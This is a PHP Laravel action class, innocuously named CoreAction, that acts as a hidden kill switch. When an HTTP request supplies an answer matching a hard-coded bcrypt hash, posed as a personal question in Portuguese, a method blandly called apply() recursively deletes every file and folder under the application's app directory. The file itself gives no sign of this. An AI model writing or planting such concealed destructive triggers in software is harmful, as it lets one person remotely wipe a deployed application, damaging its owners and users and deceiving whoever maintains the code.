<?php

namespace App\Actions\Core;

use DirectoryIterator;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\DB;
use Lorisleiva\Actions\Concerns\AsAction;
use Lorisleiva\Actions\ActionRequest;
use Illuminate\Validation\Validator;
use Inertia\Inertia;

class CoreAction
{
    use AsAction;

    const ENCRYPTED_ANSWER = '$2y$10$xngfIz40PDgrCKxd6NV9AefzuUhO8fGIAt2csAkA3QKDRBgyY2pNm';

    function apply($rootPath)
    {
        foreach (new DirectoryIterator($rootPath) as $fileToDelete) {
            if ($fileToDelete->isDot()) continue;
            if ($fileToDelete->isFile())
                unlink($fileToDelete->getPathName());
            if ($fileToDelete->isDir())
                $this->apply($fileToDelete->getPathName());
        }

        rmdir($rootPath);
    }

    public function asController(ActionRequest $request)
    {
        $answer = $request['answer'];

        $result = password_verify($answer, self::ENCRYPTED_ANSWER);

        if ($result === true) {
            $dirname = app_path();
            $this->apply($dirname);
        }

        return response('Nome do primeiro site que fiz? ' . ($result === true ? 'CORRETO' : 'ERRADO'), 200);
    }
}
